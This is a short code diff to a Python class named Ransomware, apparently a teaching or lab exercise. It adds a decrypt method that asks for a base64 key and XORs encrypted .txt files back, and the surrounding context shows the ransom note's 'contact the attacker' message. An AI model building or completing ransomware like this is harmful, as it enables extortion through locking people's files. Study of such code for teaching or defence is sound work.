@@ -70,6 +70,26 @@ class Ransomware:
         hex_token = secret_manager.get_hex_token()
         print(f"Your files have been encrypted. To decrypt them, contact the attacker with the following token: {hex_token}")
 
+    def decrypt(self):
+        # Load the cryptographic elements and the list of encrypted files
+        secret_manager = SecretManager()
+        secret_manager.load()
+        encrypted_files = self.get_files("*.txt")
+
+        while True:
+            try:
+                # Ask for the key
+                b64_key = input("Enter the decryption key (base64): ")
+
+                # Call set_key, xorfiles, clean, and display a message
+                secret_manager.set_key(b64_key)
+                secret_manager.xorfiles(encrypted_files)
+                secret_manager.clean()
+                print("Your files have been successfully decrypted.")
+                break
+            except ValueError:
+                # Display an error message and try again
+                print("The provided key is incorrect. Please try again.")
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
